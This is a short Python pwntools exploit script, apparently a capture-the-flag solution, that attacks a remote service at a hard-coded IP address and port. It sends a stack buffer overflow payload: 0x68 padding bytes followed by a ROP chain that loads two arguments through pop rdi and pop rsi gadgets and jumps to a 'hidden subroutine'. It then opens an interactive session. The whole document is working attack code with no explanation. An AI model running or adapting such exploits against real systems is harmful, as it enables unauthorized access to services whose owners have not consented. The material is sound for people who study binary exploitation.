# This code works (2023-11-23)
from pwn import *

context.log_level = "debug"
p = remote('141.164.48.98', '30007')
# p = process("./arg")

payload = b"A" * 0x68
payload += 0x400963.to_bytes(8, "little")  # pop rdi; ret
payload += 0x232300.to_bytes(8, 'little')  # 1st argument
payload += 0x400961.to_bytes(8, "little")  # pop rsi; pop r15; ret
payload += 0xFFFFFFFFDEEDBEAF.to_bytes(8, 'little') # 2nd argument
payload += b"A" * 0x8                      # No meaning value
payload += 0x4007F8.to_bytes(8, "little")  # Hidden subroutine  

# pause()
p.sendline(payload)
p.interactive()
